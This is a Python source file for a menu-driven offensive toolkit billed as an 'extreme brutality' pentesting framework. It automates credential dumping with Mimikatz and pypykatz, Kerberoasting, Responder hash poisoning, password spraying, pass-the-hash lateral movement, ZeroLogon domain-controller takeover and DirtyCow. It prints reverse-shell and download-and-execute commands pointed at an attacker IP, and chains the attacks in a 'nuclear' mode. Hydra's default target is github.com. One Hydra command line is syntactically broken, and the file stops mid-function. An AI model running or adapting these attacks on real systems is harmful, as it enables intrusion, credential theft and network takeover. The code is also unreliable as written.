import os
import sys
import subprocess
from pathlib import Path
from datetime import datetime
import json
import time

class SimpleAttacker:
    def __init__(self):
        self.results_dir = Path("results") / datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.session_file = self.results_dir / "session.json"
        self.session_data = self.load_session()
        
    def load_session(self):
        """Load previous session data for persistence"""
        if self.session_file.exists():
            with open(self.session_file, 'r') as f:
                return json.load(f)
        return {
            "credentials": [],
            "targets": [],
            "hashes": [],
            "tokens": [],
            "loot": []
        }
    
    def save_session(self):
        """Save session data"""
        with open(self.session_file, 'w') as f:
            json.dump(self.session_data, f, indent=4)
    
    def print_header(self):
        print("\n" + "="*60)
        print("🚀 ULTIMATE BRUTAL COMMANDER FOR PENTESTING")
        print("⚡ Now with EXTREME BRUTALITY modules")
        print("="*60)
    
    def run_command_live(self, cmd, tool_name):
        """Run command with live output - YOUR WAY"""
        print(f"\n🚀 Running: {cmd}")
        print("-" * 60)
        
        output_file = self.results_dir / f"{tool_name}.txt"
        
        with open(output_file, "w") as f:
            f.write(f"Command: {cmd}\n")
            f.write("="*60 + "\n")
            
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    print(line, end='', flush=True)
                    f.write(line)
                    f.flush()
            
            print("\n" + "-" * 60)
            print(f"✅ Done! Output saved to: {output_file}")
    
    def check_and_install_tool(self, tool_name, install_cmd):
        """Check if tool is installed and install if not"""
        check_cmd = f"which {tool_name}"
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"⚠️ {tool_name} not found!")
            install = input(f"Install {tool_name} now? (y/N): ").strip().lower()
            if install == 'y':
                print(f"Installing {tool_name}...")
                subprocess.run(install_cmd, shell=True)
                print(f"✅ {tool_name} installed!")
                return True
            else:
                print(f"❌ {tool_name} is required but not installed!")
                return False
        return True
    
    def clone_from_github(self, repo_url, target_dir):
        """Clone tool from GitHub if not present"""
        if not Path(target_dir).exists():
            print(f"📥 Cloning from {repo_url}...")
            result = subprocess.run(f"git clone {repo_url} {target_dir}", shell=True)
            if result.returncode == 0:
                print(f"✅ Successfully cloned to {target_dir}")
                return True
            else:
                print(f"❌ Failed to clone {repo_url}")
                return False
        return True
    
    # ============ ORIGINAL FUNCTIONS (UNCHANGED) ============
    
    def run_gobuster(self):
        """YOUR COMMAND: sudo gobuster dir -u https://pihatch.com -w (directory) --exclude-length 18979"""
        if not self.check_and_install_tool("gobuster", "sudo apt install -y gobuster"):
            return
        
        print("\n📁 GOBUSTER DIRECTORY SCAN")
        url = input("Target URL (https://example.com): ").strip()
        wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        cmd = f"sudo gobuster dir -u {url} -w {wordlist} --exclude-length 18979"
        self.run_command_live(cmd, "gobuster")
    
    def run_dirb(self):
        if not self.check_and_install_tool("dirb", "sudo apt install -y dirb"):
            return
        
        print("\n📁 DIRB DIRECTORY SCAN")
        url = input("Target URL (http://example.com): ").strip()
        wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        cmd = f"dirb {url} {wordlist} -S"
        self.run_command_live(cmd, "dirb")
    
    def run_oneshot(self):
        print("\n🔓 ONESHOT WPS ATTACK")
        
        oneshot_paths = ["OneShot/oneshot.py", "./oneshot.py", "oneshot.py"]
        oneshot_dir = "OneShot"
        
        for path in oneshot_paths:
            if Path(path).exists():
                print(f"✅ Found OneShot at: {path}")
                oneshot_path = path
                break
        else:
            print("❌ OneShot not found!")
            clone = input("Clone OneShot from GitHub? (y/N): ").strip().lower()
            if clone == 'y':
                if self.clone_from_github("https://github.com/drygdryg/OneShot.git", oneshot_dir):
                    oneshot_path = "OneShot/oneshot.py"
                    subprocess.run("pip3 install -r OneShot/requirements.txt", shell=True)
                else:
                    return
            else:
                print("❌ OneShot is required for this attack!")
                return
        
        interface = input("Wireless interface (wlan0): ").strip() or "wlan0"
        
        cmd = f"sudo python3 {oneshot_path} -i {interface} -K"
        self.run_command_live(cmd, "oneshot")
    
    def run_hydra(self):
        if not self.check_and_install_tool("hydra", "sudo apt install -y hydra"):
            return
        
        print("\n🔐 HYDRA LOGIN ATTACK")
        
        target = input("Target (github.com): ").strip() or "github.com"
        username = input("Username (admin): ").strip() or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        password_file = input("Password file [/usr/share/wordlists/rockyou.txt]: ").strip()
        
        if not password_file:
            password_file = "/usr/share/wordlists/rockyou.txt"
        
        if not Path(password_file).exists():
            print(f"⚠️ Password file not found: {password_file}")
            download = input("Download rockyou.txt? (y/N): ").strip().lower()
            if download == 'y':
                print("📥 Extracting rockyou.txt...")
                subprocess.run("sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true", shell=True)
        
        cmd = f'sudo hydra -t 4 -V -f -l {username} -P {password_file} {target} http-post-form "/login:Username or email address=^USER^&Password=^PASS^&Login=Sign in:F=Incorrect username or password."'
        self.run_command_live(cmd, "hydra")
    
    def run_medusa(self):
        if not self.check_and_install_tool("medusa", "sudo apt install -y medusa"):
            return
        
        print("\n⚡ MEDUSA ATTACK")
        
        target = input("Target IP/URL: ").strip()
        username = input("Username (admin): ").strip() or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        password_file = input("Password file: ").strip() or "/usr/share/wordlists/rockyou.txt"
        
        cmd = f"medusa -h {target} -u {username} -P {password_file} -M http"
        self.run_command_live(cmd, "medusa")
    
    def run_setoolkit(self):
        if not self.check_and_install_tool("setoolkit", "sudo apt install -y set"):
            return
        
        print("\n🎭 SETOOLKIT SOCIAL ENGINEERING")
        print("Launching SEToolkit...")
        
        cmd = "setoolkit"
        self.run_command_live(cmd, "setoolkit")
    
    def run_bettercap(self):
        if not self.check_and_install_tool("bettercap", "sudo apt install -y bettercap"):
            return
        
        print("\n👂 BETTERCAP MITM ATTACK")
        
        interface = input("Network interface (eth0): ").strip() or "eth0"
        target = input("Target IP/Range (192.168.1.0/24): ").strip() or "192.168.1.0/24"
        
        cmd = f"sudo bettercap -iface {interface}"
        print(f"\n🚀 Manually run in Bettercap:")
        print(f"  net.probe on")
        print(f"  net.recon on")
        print(f"  set arp.spoof.targets {target}")
        print(f"  arp.spoof on")
        print(f"  net.sniff on")
        
        run_now = input("\nRun Bettercap now? (y/N): ").strip().lower()
        if run_now == 'y':
            self.run_command_live(cmd, "bettercap")
    
    def run_mitmproxy(self):
        if not self.check_and_install_tool("mitmproxy", "sudo apt install -y mitmproxy"):
            return
        
        print("\n🌐 MITMPROXY INTERCEPTION")
        port = input("Port (8080): ").strip() or "8080"
        
        cmd = f"mitmproxy -p {port}"
        self.run_command_live(cmd, "mitmproxy")
    
    def run_nmap(self):
        if not self.check_and_install_tool("nmap", "sudo apt install -y nmap"):
            return
        
        print("\n🔍 NMAP SCAN")
        target = input("Target (192.168.1.1) or example.com : ").strip() or "192.168.1.1"
        
        cmd = f"nmap -sV -sC {target}"
        self.run_command_live(cmd, "nmap")
    
    def run_sqlmap(self):
        if not self.check_and_install_tool("sqlmap", "sudo apt install -y sqlmap"):
            return
        
        print("\n💉 SQLMAP INJECTION TEST")
        url = input("Target URL with parameter (http://test.com/page?id=1): ").strip()
        
        if not url:
            print("❌ No URL provided!")
            return
        
        cmd = f"sqlmap -u '{url}' --batch"
        self.run_command_live(cmd, "sqlmap")
    
    def run_quick_scan(self):
        print("\n⚡ QUICK ALL-IN-ONE SCAN")
        target = input("Target (example.com or IP): ").strip()
        
        if not target:
            print("❌ No target provided!")
            return
        
        tools_to_check = [
            ("nmap", "sudo apt install -y nmap"),
            ("gobuster", "sudo apt install -y gobuster"),
            ("hydra", "sudo apt install -y hydra")
        ]
        
        for tool, install_cmd in tools_to_check:
            self.check_and_install_tool(tool, install_cmd)
        
        print(f"\n🎯 Running quick scans on {target}...")
        
        if input("\nRun Nmap scan? (y/N): ").strip().lower() == 'y':
            cmd = f"nmap -sV -sC {target}"
            self.run_command_live(cmd, "quick_nmap")
        
        if ("http://" in target or "https://" in target) and input("\nRun Gobuster? (y/N): ").strip().lower() == 'y':
            cmd = f"sudo gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt --exclude-length 18979"
            self.run_command_live(cmd, "quick_gobuster")
        
        if input("\nCheck for common logins? (y/N): ").strip().lower() == 'y':
            cmd = f"sudo hydra -t 4 -f -L seclists/Usernames/CommonAdminBase64.txt -P /usr/share/seclists/Passwords/corporate_passwords.txt "ftp://" in target "
            self.run_command_live(cmd, "quick_hydra")
        
        print(f"\n✅ Quick scan complete! Check {self.results_dir}")
    
    # ============ EXTREME BRUTALITY MODULES ============
    
    def run_mimikatz(self):
        """💀 MIMIKATZ - Dump LSASS secrets, Golden Tickets, Pass-the-Hash"""
        print("\n💀 MIMIKATZ BRUTAL ATTACK")
        print("="*60)
        print("⚠️  This will extract passwords, hashes, and Kerberos tickets")
        print("⚠️  Requires Windows target or dumped LSASS memory")
        
        if not self.check_and_install_tool("wine", "sudo apt install -y wine"):
            return
        
        # Download mimikatz if not present
        mimikatz_path = "mimikatz_trunk.zip"
        if not Path("mimikatz").exists():
            print("📥 Downloading Mimikatz...")
            subprocess.run("wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -O mimikatz.zip 2>/dev/null", shell=True)
            subprocess.run("unzip -o mimikatz.zip -d mimikatz 2>/dev/null", shell=True)
        
        print("\n🎯 Select attack:")
        print("1. Dump LSASS memory (remote)")
        print("2. Extract passwords from dump file")
        print("3. Golden Ticket attack")
        print("4. Pass-the-Hash")
        print("5. DCSync (Domain Admin)")
        
        choice = input("\nSelect (1-5): ").strip()
        
        if choice == "1":
            target = input("Target IP: ").strip()
            print("🚀 Using procdump to dump LSASS...")
            cmd = f"python3 -c \"from pypykatz import pypykatz; import minidump; mimi = pypykatz.parse_minidump_file('lsass.dmp'); print(mimi)\""
            self.run_command_live(cmd, "mimikatz_lsass")
            
        elif choice == "2":
            dump_file = input("LSASS dump file: ").strip()
            cmd = f"pypykatz lsa minidump {dump_file}"
            self.run_command_live(cmd, "mimikatz_dump")
            
        elif choice == "3":
            domain = input("Domain: ").strip()
            sid = input("Domain SID: ").strip()
            krbtgt_hash = input("KRBTGT NTLM hash: ").strip()
            user = input("Username to impersonate: ").strip() or "Administrator"
            cmd = f"ticketer.py -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} {user}"
            self.run_command_live(cmd, "golden_ticket")
            
        elif choice == "4":
            target = input("Target IP: ").strip()
            username = input("Username: ").strip()
            hash = input("NTLM hash: ").strip()
            cmd = f"pth-winexe -U {username}%{hash} //{target} cmd.exe"
            self.run_command_live(cmd, "pass_the_hash")
            
        elif choice == "5":
            dc_ip = input("Domain Controller IP: ").strip()
            domain = input("Domain: ").strip()
            user = input("Username: ").strip()
            password = input("Password: ").strip()
            cmd = f"secretsdump.py {domain}/{user}:{password}@{dc_ip}"
            self.run_command_live(cmd, "dcsync")
            
        else:
            print("❌ Invalid choice!")
    
    def run_bloodhound(self):
        """🩸 BLOODHOUND - AD Attack Path Visualization"""
        print("\n🩸 BLOODHOUND AD ATTACK")
        print("="*60)
        print("⚠️  Maps ALL attack paths in Active Directory")
        print("⚠️  Finds fastest path to Domain Admin")
        
        if not self.check_and_install_tool("neo4j", "sudo apt install -y neo4j"):
            print("📥 Installing BloodHound manually...")
            subprocess.run("wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip", shell=True)
            subprocess.run("unzip BloodHound-linux-x64.zip", shell=True)
        
        print("\n🎯 Select collection method:")
        print("1. SharpHound (Windows - needs execution)")
        print("2. BloodHound.py (Linux)")
        print("3. Ingest existing data")
        
        choice = input("\nSelect (1-3): ").strip()
        
        if choice == "1":
            target = input("Target IP/Domain: ").strip()
            print("💉 Use this command on Windows target:")
            print(f"IEX(New-Object Net.WebClient).DownloadString('http://your-ip/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All")
            input("\nPress Enter after data collection...")
            
        elif choice == "2":
            domain = input("Domain: ").strip()
            username = input("Username: ").strip()
            password = input("Password: ").strip()
            cmd = f"bloodhound-python -d {domain} -u {username} -p {password} -ns 10.10.10.10 -c All"
            self.run_command_live(cmd, "bloodhound_python")
            
        elif choice == "3":
            data_dir = input("Path to collected JSON files: ").strip()
            print("🚀 Starting BloodHound UI...")
            cmd = "./BloodHound --no-sandbox"
            self.run_command_live(cmd, "bloodhound_ui")
            
        else:
            print("❌ Invalid choice!")
    
    def run_kerberoast(self):
        """🔥 KERBEROASTING - Steal service tickets"""
        print("\n🔥 KERBEROASTING ATTACK")
        print("="*60)
        print("⚠️  Extracts TGS tickets for offline cracking")
        
        domain = input("Domain (domain.local): ").strip() or "domain.local"
        username = input("Username: ").strip()
        password = input("Password: ").strip()
        dc_ip = input("Domain Controller IP: ").strip()
        
        cmd = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request"
        self.run_command_live(cmd, "kerberoast")
        
        print("\n🔨 Crack with hashcat:")
        print("hashcat -m 13100 hashes.txt rockyou.txt")
    
    def run_responder(self):
        """🎣 RESPONDER - LLMNR/NBT-NS Poisoning"""
        print("\n🎣 RESPONDER POISONING ATTACK")
        print("="*60)
        print("⚠️  Steals NTLMv1/v2 hashes from network")
        print("⚠️  Works by poisoning name resolution")
        
        interface = input("Interface (eth0): ").strip() or "eth0"
        
        print("\n🎯 Select mode:")
        print("1. Basic poisoning (LMNMR/NBT-NS)")
        print("2. WPAD attack (proxy)")
        print("3. DHCPv6 attack (IPv6)")
        print("4. ALL attacks (BRUTAL)")
        
        choice = input("\nSelect (1-4): ").strip()
        
        if choice == "1":
            cmd = f"sudo responder -I {interface} -wrf"
        elif choice == "2":
            cmd = f"sudo responder -I {interface} -wF"
        elif choice == "3":
            cmd = f"sudo responder -I {interface} -6"
        elif choice == "4":
            cmd = f"sudo responder -I {interface} -wrfFv"
        else:
            print("❌ Invalid choice!")
            return
        
        print("\n🚀 Captured hashes will be saved to /usr/share/responder/logs/")
        print("🔨 Crack with: hashcat -m 5600 hash.txt rockyou.txt")
        self.run_command_live(cmd, "responder")
    
    def run_crackmapexec(self):
        """💣 CRACKMAPEXEC - Brutal Windows/AD Attack Swiss Army Knife"""
        print("\n💣 CRACKMAPEXEC - WINDOWS BRUTALITY")
        print("="*60)
        print("⚠️  Password spraying, lateral movement, execution")
        
        target = input("Target/Range (192.168.1.0/24): ").strip()
        username = input("Username(s) or file: ").strip() or "administrator"
        password = input("Password(s) or file: ").strip() or "Password123"
        
        print("\n🎯 Select attack:")
        print("1. Password spray (BRUTAL)")
        print("2. Execute command on all")
        print("3. Dump SAM")
        print("4. Dump LSA secrets")
        print("5. Golden Ticket check")
        
        choice = input("\nSelect (1-5): ").strip()
        
        if choice == "1":
            cmd = f"crackmapexec smb {target} -u '{username}' -p '{password}' --continue-on-success"
        elif choice == "2":
            command = input("Command to execute: ").strip() or "whoami"
            cmd = f"crackmapexec smb {target} -u '{username}' -p '{password}' -x '{command}'"
        elif choice == "3":
            cmd = f"crackmapexec smb {target} -u '{username}' -p '{password}' --sam"
        elif choice == "4":
            cmd = f"crackmapexec smb {target} -u '{username}' -p '{password}' --lsa"
        elif choice == "5":
            cmd = f"crackmapexec smb {target} -u '{username}' -p '{password}' --golden-ticket ticket.kirbi"
        else:
            print("❌ Invalid choice!")
            return
        
        self.run_command_live(cmd, "crackmapexec")
    
    def run_metasploit(self):
        """💉 METASPLOIT - Exploit Delivery & Payloads"""
        print("\n💉 METASPLOIT FRAMEWORK")
        print("="*60)
        print("⚠️  Auto-exploitation and payload delivery")
        
        print("\n🎯 Quick exploit options:")
        print("1. EternalBlue (MS17-010)")
        print("2. BlueKeep (CVE-2019-0708)")
        print("3. SMBGhost (CVE-2020-0796)")
        print("4. Custom exploit")
        
        choice = input("\nSelect (1-4): ").strip()
        
        if choice == "1":
            target = input("Target IP: ").strip()
            print(f"\n🚀 Use in Metasploit:")
            print(f"use exploit/windows/smb/ms17_010_eternalblue")
            print(f"set RHOSTS {target}")
            print(f"exploit")
            input("\nPress Enter to launch msfconsole...")
            cmd = "msfconsole -q"
            
        elif choice == "2":
            target = input("Target IP: ").strip()
            print(f"\n🚀 Use in Metasploit:")
            print(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce")
            print(f"set RHOSTS {target}")
            print(f"exploit")
            input("\nPress Enter to launch msfconsole...")
            cmd = "msfconsole -q"
            
        elif choice == "3":
            target = input("Target IP: ").strip()
            print(f"\n🚀 Use in Metasploit:")
            print(f"use exploit/windows/smb/cve_2020_0796_smbghost")
            print(f"set RHOSTS {target}")
            print(f"exploit")
            input("\nPress Enter to launch msfconsole...")
            cmd = "msfconsole -q"
            
        elif choice == "4":
            cmd = "msfconsole"
        else:
            print("❌ Invalid choice!")
            return
        
        self.run_command_live(cmd, "metasploit")
    
    def run_empire(self):
        """👑 EMPIRE - Post-Exploitation Framework"""
        print("\n👑 EMPIRE POST-EXPLOITATION")
        print("="*60)
        print("⚠️  PowerShell agents, lateral movement, persistence")
        
        if not Path("Empire").exists():
            print("📥 Cloning Empire...")
            self.clone_from_github("https://github.com/EmpireProject/Empire.git", "Empire")
            print("⚙️ Installing...")
            subprocess.run("cd Empire && sudo ./setup/install.sh", shell=True)
        
        print("\n🚀 Starting Empire server...")
        print("📋 Common commands after start:")
        print("  listeners") 
        print("  uselistener http")
        print("  set Host http://your-ip")
        print("  execute")
        print("  agents")
        print("  interact AGENT_NAME")
        print("  bypassuac")
        
        cmd = "cd Empire && sudo ./empire"
        self.run_command_live(cmd, "empire")
    
    def run_priv_esc_linux(self):
        """🐧 LINUX PRIVILEGE ESCALATION - Automated"""
        print("\n🐧 LINUX PRIV ESCALATION")
        print("="*60)
        print("⚠️  Auto-finds kernel exploits, SUID, cron jobs")
        
        print("\n🎯 Select method:")
        print("1. LinPEAS (Comprehensive)")
        print("2. Linux Exploit Suggester")
        print("3. SUID/SGID finder")
        print("4. DirtyCow exploit")
        
        choice = input("\nSelect (1-4): ").strip()
        
        if choice == "1":
            print("📥 Downloading LinPEAS...")
            cmd = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
            self.run_command_live(cmd, "linpeas")
            
        elif choice == "2":
            print("📥 Downloading Linux Exploit Suggester...")
            cmd = "perl /usr/share/exploitdb/exploits/linux/local/linux-exploit-suggester.pl"
            self.run_command_live(cmd, "linux_exploit_suggester")
            
        elif choice == "3":
            cmd = "find / -perm -4000 -type f 2>/dev/null"
            self.run_command_live(cmd, "suid_finder")
            
        elif choice == "4":
            print("💣 DirtyCow exploit (CVE-2016-5195)")
            cmd = "gcc -pthread /usr/share/exploitdb/exploits/linux/local/40839.c -o dirty -lcrypt && ./dirty password"
            self.run_command_live(cmd, "dirtycow")
            
        else:
            print("❌ Invalid choice!")
    
    def run_priv_esc_windows(self):
        """🪟 WINDOWS PRIVILEGE ESCALATION - Automated"""
        print("\n🪟 WINDOWS PRIV ESCALATION")
        print("="*60)
        print("⚠️  Auto-finds token privileges, unquoted paths, services")
        
        print("\n🎯 Select method:")
        print("1. WinPEAS (Comprehensive)")
        print("2. PowerUp (PowerShell)")
        print("3. JuicyPotato (Service abuse)")
        print("4. PrintSpoofer (CVE-2020-1337)")
        
        choice = input("\nSelect (1-4): ").strip()
        
        if choice == "1":
            print("💉 Use on Windows target:")
            print("IEX(New-Object Net.WebClient).DownloadString('http://your-ip/winPEAS.ps1')")
            input("\nPress Enter after running...")
            
        elif choice == "2":
            print("💉 Use on Windows target:")
            print("IEX(New-Object Net.WebClient).DownloadString('http://your-ip/PowerUp.ps1'); Invoke-AllChecks")
            input("\nPress Enter after running...")
            
        elif choice == "3":
            print("💣 JuicyPotato exploit")
            print("Download: https://github.com/ohpe/juicy-potato")
            print("Usage: JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami\"")
            input("\nPress Enter after download...")
            
        elif choice == "4":
            print("💣 PrintSpoofer exploit (CVE-2020-1337)")
            print("Download: https://github.com/itm4n/PrintSpoofer")
            print("Usage: PrintSpoofer.exe -i -c cmd")
            input("\nPress Enter after download...")
            
        else:
            print("❌ Invalid choice!")
    
    def run_zerologon(self):
        """☢️ ZEROLOGON - CVE-2020-1472 (Domain Controller Takeover)"""
        print("\n☢️ ZEROLOGON ATTACK (CVE-2020-1472)")
        print("="*60)
        print("⚠️  CRITICAL: Compromises Domain Controllers")
        print("⚠️  Sets DC machine account password to empty")
        
        if not Path("zerologon").exists():
            print("📥 Downloading ZeroLogon exploit...")
            self.clone_from_github("https://github.com/SecuraBV/CVE-2020-1472.git", "zerologon")
        
        dc_ip = input("Domain Controller IP: ").strip()
        dc_name = input("DC NetBIOS Name (DC01$): ").strip()
        
        print(f"\n🚀 Exploiting {dc_name} at {dc_ip}...")
        print("💣 This will set DC password to empty!")
        
        confirm = input("\n⚠️  CONFIRM: This can break AD! Continue? (YES/no): ").strip()
        if confirm != "YES":
            print("❌ Cancelled!")
            return
        
        cmd = f"cd zerologon && python3 zerologon.py {dc_name} {dc_ip}"
        self.run_command_live(cmd, "zerologon")
        
        print("\n🔧 Restore original hash after exploitation:")
        print(f"secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 {dc_name}$@{dc_ip}")
    
    def run_psexec_brutal(self):
        """💀 PSEXEC BRUTAL - Mass lateral movement"""
        print("\n💀 PSEXEC BRUTAL LATERAL MOVEMENT")
        print("="*60)
        print("⚠️  Pass-the-Hash to multiple targets")
        print("⚠️  Executes commands on ALL compromised systems")
        
        target_file = input("Targets file (one per line): ").strip() or "targets.txt"
        username = input("Username: ").strip() or "administrator"
        hash = input("NTLM hash: ").strip()
        command = input("Command to execute: ").strip() or "whoami"
        
        print(f"\n🚀 Executing on ALL targets in {target_file}...")
        
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        for target in targets:
            print(f"\n🎯 Attacking: {target}")
            cmd = f"pth-winexe -U {username}%{hash} //{target} '{command}'"
            self.run_command_live(cmd, f"psexec_{target}")
    
    def run_dns_admin(self):
        """🌐 DNS ADMIN TO DOMAIN ADMIN - Forgotten attack path"""
        print("\n🌐 DNS ADMIN → DOMAIN ADMIN")
        print("="*60)
        print("⚠️  If in DNS Admins group = Full Domain Compromise")
        
        dc_ip = input("Domain Controller IP: ").strip()
        username = input("DNS Admin username: ").strip()
        password = input("Password: ").strip()
        attacker_ip = input("Your IP for DLL: ").strip()
        
        print(f"\n📝 Steps:")
        print(f"1. Create malicious DLL on {attacker_ip}")
        print(f"2. Compile with: msfvenom -p windows/x64/shell_reverse_tcp LHOST={attacker_ip} LPORT=4444 -f dll -o evil.dll")
        print(f"3. Share: sudo impacket-smbserver share .")
        print(f"4. Execute on DC:")
        print(f"   dnscmd.exe /config /serverlevelplugindll \\\\{attacker_ip}\\share\\evil.dll")
        print(f"5. Restart DNS: Restart-Service DNS")
        print(f"6. Trigger: nslookup test.domain.local")
        
        input("\nPress Enter to continue...")
    
    def run_all_brutal(self):
        """💥 NUCLEAR OPTION - Run ALL brutal attacks"""
        print("\n💥 NUCLEAR OPTION - ALL BRUTAL ATTACKS")
        print("="*60)
        print("⚠️  WARNING: This is EXTREMELY aggressive!")
        print("⚠️  Will trigger EVERY alarm!")
        print("="*60)
        
        target = input("Primary target IP/Domain: ").strip()
        
        print("\n🎯 Attack sequence:")
        print("1. Nmap aggressive scan")
        print("2. Responder poisoning")
        print("3. CrackMapExec password spray")
        print("4. Kerberoasting if domain")
        print("5. ZeroLogon if DC found")
        print("6. BloodHound enumeration")
        print("7. Lateral movement with PSExec")
        
        confirm = input("\n⚠️  LAUNCH NUCLEAR ATTACK? (type NUCLEAR): ").strip()
        if confirm != "NUCLEAR":
            print("❌ Cancelled!")
            return
        
        # 1. Nmap
        print("\n[1/7] 🔍 Nmap aggressive scan...")
        cmd = f"nmap -A -T4 -p- {target}"
        self.run_command_live(cmd, "nuclear_nmap")
        
        # 2. Responder
        print("\n[2/7] 🎣 Responder poisoning...")
        cmd = "sudo responder -I eth0 -wrfFv"
        subprocess.Popen(cmd, shell=True)
        
        # 3. CrackMapExec
        print("\n[3/7] 💣 CrackMapExec spray...")
        cmd = f"crackmapexec smb {target} -u administrator -p Password123,admin,Administrator,password --continue-on-success"
        self.run_command_live(cmd, "nuclear_cme")
        
        # 4. Check for AD
        print("\n[4/7] 🔥 Kerberoasting check...")
        cmd = f"GetUserSPNs.py domain/administrator:password@{target} -request 2>/dev/null || echo 'Not AD'"
        self.run_command_live(cmd, "nuclear_kerberoast")
        
        # 5. ZeroLogon check
        print("\n[5/7] ☢️ ZeroLogon check...")
        cmd = f"python3 zerologon.py DC01 {target} 2>/dev/null || echo 'Not vulnerable'"
        self.run_command_live(cmd, "nuclear_zerologon")
        
        # 6. BloodHound
        print("\n[6/7] 🩸 BloodHound collection...")
        cmd = f"bloodhound-python -d domain.local -u administrator -p password -c All -ns {target}"
        self.run_command_live(cmd, "nuclear_bloodhound")
        
        # 7. PSExec if hashes found
        print("\n[7/7] 💀 Lateral movement...")
        print("Checking for captured hashes...")
        
        print("\n✅ NUCLEAR ATTACK COMPLETE!")
        print("📁 Check all results in:", self.results_dir)
    
    def install_all_brutal(self):
        """🛠️ INSTALL ALL BRUTAL TOOLS"""
        print("\n🛠️ INSTALLING BRUTAL TOOLKIT")
        print("="*60)
        
        tools = [
            ("impacket", "pip3 install impacket"),
            ("bloodhound-python", "pip3 install bloodhound"),
            ("crackmapexec", "sudo apt install -y crackmapexec"),
            ("responder", "sudo apt install -y responder"),
            ("hashcat", "sudo apt install -y hashcat"),
            ("seclists", "sudo apt install -y seclists"),
            ("powershell", "sudo apt install -y powershell"),
            ("pth-tools", "sudo apt install -y pth-tools"),
        ]
        
        for tool, cmd in tools:
            print(f"\n📦 Installing {tool}...")
            subprocess.run(cmd, shell=True)
        
        print("\n📥 Cloning GitHub tools...")
        repos = [
            ("https://github.com/gentilkiwi/mimikatz.git", "mimikatz"),
            ("https://github.com/BloodHoundAD/BloodHound.git", "BloodHound"),
            ("https://github.com/EmpireProject/Empire.git", "Empire"),
            ("https://github.com/SecuraBV/CVE-2020-1472.git", "zerologon"),
            ("https://github.com/PowerShellMafia/PowerSploit.git", "PowerSploit"),
            ("https://github.com/carlospolop/PEASS-ng.git", "PEASS"),
        ]
        
        for repo, dir_name in repos:
            print(f"📥 Cloning {dir_name}...")
            self.clone_from_github(repo, dir_name)
        
        print("\n✅ BRUTAL TOOLKIT INSTALLED!")
        print("🚀 Ready for extreme penetration testing!")
    
    def main_menu(self):
        while True:
            self.print_header()
            
            print("\n" + "="*30 + " ORIGINAL TOOLS " + "="*30)
            print(" 1. 📁 Gobuster (Directory scan)")
            print(" 2. 📁 Dirb (Directory scan)")
            print(" 3. 🔓 OneShot (WPS attack)")
            print(" 4. 🔐 Hydra (Login brute force)")
            print(" 5. ⚡ Medusa (Fast login attacks)")
            print(" 6. 🎭 SEToolkit (Social engineering)")
            print(" 7. 👂 Bettercap (MITM attacks)")
            print(" 8. 🌐 MITMproxy (Web interception)")
            print(" 9. 🔍 Nmap (Port scanning)")
            print("10. 💉 SQLMap (SQL injection)")
            print("11. ⚡ Quick All-in-One Scan")
            
            print("\n" + "="*30 + " BRUTAL MODULES " + "="*30)
            print("12. 💀 Mimikatz (Credential dumping)")
            print("13. 🩸 BloodHound (AD attack paths)")
            print("14. 🔥 Kerberoasting (Steal tickets)")
            print("15. 🎣 Responder (Hash poisoning)")
            print("16. 💣 CrackMapExec (Windows Swiss Army)")
            print("17. 💉 Metasploit (Exploit framework)")
            print("18. 👑 Empire (Post-exploitation)")
            print("19. 🐧 Linux Priv Esc (Auto)")
            print("20. 🪟 Windows Priv Esc (Auto)")
            print("21. ☢️ ZeroLogon (DC takeover)")
            print("22. 💀 PSExec Brutal (Lateral movement)")
            print("23. 🌐 DNS Admin to DA")
            print("24. 💥 NUCLEAR OPTION (All attacks)")
            print("25. 🛠️ Install All Brutal Tools")
            print("26. 🚪 Exit")
            
            choice = input("\nSelect (1-26): ").strip()
            
            menu_options = {
                "1": self.run_gobuster,
                "2": self.run_dirb,
                "3": self.run_oneshot,
                "4": self.run_hydra,
                "5": self.run_medusa,
                "6": self.run_setoolkit,
                "7": self.run_bettercap,
                "8": self.run_mitmproxy,
                "9": self.run_nmap,
                "10": self.run_sqlmap,
                "11": self.run_quick_scan,
                "12": self.run_mimikatz,
                "13": self.run_bloodhound,
                "14": self.run_kerberoast,
                "15": self.run_responder,
                "16": self.run_crackmapexec,
                "17": self.run_metasploit,
                "18": self.run_empire,
                "19": self.run_priv_esc_linux,
                "20": self.run_priv_esc_windows,
                "21": self.run_zerologon,
                "22": self.run_psexec_brutal,
                "23": self.run_dns_admin,
                "24": self.run_all_brutal,
                "25": self.install_all_brutal,
            }
            
            if choice in menu_options:
                menu_options[choice]()
            elif choice == "26":
                print("\n👋 Goodbye! Stay ethical!")
                self.save_session()
                break
            else:
                print("❌ Invalid choice!")
            
            input("\nPress Enter to continue...")

def main():
    """Main function"""
    print("="*70)
    print("🚨 EXTREME BRUTALITY PENTESTING FRAMEWORK")
    print("="*70)
    print("⚠️  WARNING: FOR AUTHORIZED TESTING ONLY!")
    print("⚠️  Unauthorized use is ILLEGAL. Coded by Taief.")
    print("="*70)
    
